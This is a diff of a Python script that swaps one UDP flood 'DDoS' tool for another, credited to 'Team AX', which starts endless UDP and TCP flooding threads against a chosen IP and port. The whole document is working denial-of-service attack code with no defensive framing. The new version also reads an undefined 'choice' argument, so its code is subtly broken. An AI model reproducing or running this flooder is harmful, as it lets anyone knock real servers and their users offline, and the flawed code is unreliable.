@@ -1,58 +1,57 @@
-#!/usr/bin/python3
-
+#!/usr/bin/env python3
+# Code by Khalid Mahmud
 import argparse
+import random
 import socket
 import threading
-import random
-import time
 
-class DDoS:
-    def __init__(self, ip, port, duration):
-        self.target = ip
-        self.port = port
-        self.duration = duration
+ap = argparse.ArgumentParser()
+ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
+ap.add_argument("-p", "--port", required=True, type=int, help="Port")
+ap.add_argument("-t", "--times", type=int, default=500, help="Packets per one connection")
+ap.add_argument("-th", "--threads", type=int, default=6, help="Threads")
+args = vars(ap.parse_args())
 
-    def attack(self):
-        print(f"[*] Starting UDP attack on {self.target}:{self.port} for {self.duration} seconds...")
-        start_time = time.time()
-        while time.time() - start_time < self.duration:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                data = random._urandom(1024)  # Generate random data to send
-                s.sendto(data, (self.target, self.port))
-                print(f"\033[92m.\033[0m", end="", flush=True)  # Print dot for each packet sent
-            except Exception as e:
-                print(f"[*] Error: {str(e)}")
+print("--> Created BY Team AX <--")
+print("#-- AX SERVER FREEZE --#")
 
-            time.sleep(0.01)  # Adjust delay between packets for optimal performance
+ip = args['ip']
+port = args['port']
+times = args['times']
+threads = args['threads']
 
-        print(f"\n[*] UDP attack finished on {self.target}:{self.port}")
+def run():
+    data = random._urandom(1024)
+    i = random.choice(("[*]", "[!]", "[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip), int(port))
+            for x in range(times):
+                s.sendto(data, addr)
+            print("\033[92m" + i + " ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
+        except Exception as e:
+            print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m", e)
 
-def parse_args():
-    parser = argparse.ArgumentParser(description="DDoS UDP Attack Script")
-    parser.add_argument("--ip", dest="ip", required=True, help="Target IP address")
-    parser.add_argument("--port", dest="port", type=int, required=True, help="Target port number")
-    parser.add_argument("--threads", dest="threads", type=int, required=True, help="Number of threads to use")
-    parser.add_argument("--duration", dest="duration", type=int, required=True, help="Duration of attack in seconds")
-    return parser.parse_args()
+def run2():
+    data = random._urandom(16)
+    i = random.choice(("[*]", "[!]", "[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print("\033[92m" + i + " ATTACK STARTED BY AX S-FLODER!!!!\033[0m")
+        except Exception as e:
+            print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m", e)
+            s.close()
 
-def main():
-    args = parse_args()
-    ip = args.ip
-    port = args.port
-    threads = args.threads
-    duration = args.duration
-
-    ddos_threads = []
-
-    for _ in range(threads):
-        ddos = DDoS(ip, port, duration)
-        ddos_thread = threading.Thread(target=ddos.attack)
-        ddos_threads.append(ddos_thread)
-        ddos_thread.start()
-
-    for thread in ddos_threads:
-        thread.join()
-
-if __name__ == "__main__":
-    main()
+for y in range(threads):
+    if args['choice'] == 'y':
+        th = threading.Thread(target=run)
+        th.start()
+    else:
+        th = threading.Thread(target=run2)
+        th.start()
